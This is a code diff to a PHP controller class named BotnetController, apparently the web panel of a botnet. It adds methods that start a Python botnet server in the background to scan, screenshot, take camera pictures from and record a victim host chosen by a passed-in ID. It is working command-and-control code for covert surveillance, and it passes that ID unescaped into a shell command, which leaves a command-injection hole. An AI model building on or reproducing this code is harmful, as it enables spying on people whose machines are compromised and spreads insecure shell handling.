@@ -61,7 +61,7 @@ class BotnetController extends Controller
 
     public function botnet_is_running(): bool
     {
-        $command = 'pgrep -c -f "python3"';
+        $command = 'pgrep -c "python3"';
         $result = exec($command);
 
         if ($result != 0 ){
@@ -168,6 +168,43 @@ class BotnetController extends Controller
 
         return response()->download($storagePath);
     }
+
+    public function scan($uid){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --scan  --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
+    public function screenshot($uid){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --screenshot --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
+    public function picture($uid){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --picture --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
+    public function record($uid){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --record --time 10 --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+    
 
 
 }
